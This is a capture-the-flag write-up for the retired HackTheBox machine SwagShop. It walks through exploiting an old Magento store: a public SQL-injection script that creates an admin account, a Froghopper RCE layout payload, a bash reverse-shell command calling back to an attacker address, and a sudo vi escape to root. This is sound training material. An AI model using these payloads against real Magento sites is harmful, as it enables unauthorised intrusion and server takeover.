# HackTheBox — SwagShop

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / Magento / sudo vi  
**Status:** Retired  

---

## Summary

SwagShop is a Linux machine running an old Magento e-commerce platform. Two public exploits are chained: one creates an admin account (CVE-2015-1397) and another achieves RCE via a Magento Froghopper technique (CVE-2015-1398). Privilege escalation uses a sudo rule for `vi` within the web root.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/swagshop 10.10.10.140
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.29
```

Add to `/etc/hosts`:

```
10.10.10.140  swagshop.htb
```

### Identify Magento Version

```bash
curl -s http://swagshop.htb/RELEASE_NOTES.txt | head -5
# Magento eCommerce Platform, Enterprise Edition 1.7.0.2
```

Or check:

```
http://swagshop.htb/app/etc/local.xml  (DB credentials)
```

---

## Exploitation

### CVE-2015-1397 — Magento SQL Injection (Create Admin)

```bash
# Public PoC: magento-sqli.py
python magento-sqli.py http://swagshop.htb
```

This exploits a SQLi in the Magento admin path to create an admin user `forme:forme`.

Verify login at `http://swagshop.htb/index.php/admin`.

### CVE-2015-1398 — Magento Froghopper RCE

After authenticating as admin:

1. Navigate to: **System → Configuration → Advanced → Developer → Template Settings**
2. Enable "Allow Symlinks"

3. Navigate to: **Catalog → Manage Categories** → add a new category
4. Set the "Custom Design" layout update XML:

```xml
<layout><reference name="root"><block type="core/template" template="../../../../../../proc/self/fd/7"></block></reference></layout>
```

Alternatively, use the automated exploit:

```bash
python rce.py http://swagshop.htb/index.php/admin forme forme "whoami"
```

For a reverse shell:

```bash
python rce.py http://swagshop.htb/index.php/admin forme forme \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"
```

Shell as **www-data**.

---

## User Flag

```bash
cat /home/haris/user.txt
```

---

## Privilege Escalation

### Sudo Check

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

### GTFOBins — vi sudo escape

```bash
sudo /usr/bin/vi /var/www/html/anyfile
```

Inside vi:

```
:!/bin/bash
```

**Root shell obtained.**

---

## Root Flag

```bash
cat /root/root.txt
```

Note: The root flag contains a fun message referencing the box theme.

---

## Key Takeaways

- Magento 1.x is full of critical CVEs — always version-check it
- SQL injection → admin account creation → RCE is a common Magento exploit chain
- `vi`/`vim` sudo escapes with `:!/bin/bash` are classic GTFOBins entries
- Wildcards in sudo rules (`/var/www/html/*`) don't restrict which file you open
- Check `RELEASE_NOTES.txt` and `app/etc/local.xml` on Magento instances

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| magento-sqli.py | SQLi admin creation |
| rce.py | Froghopper RCE |
| netcat | Reverse shell listener |
| vi + GTFOBins | Privilege escalation |
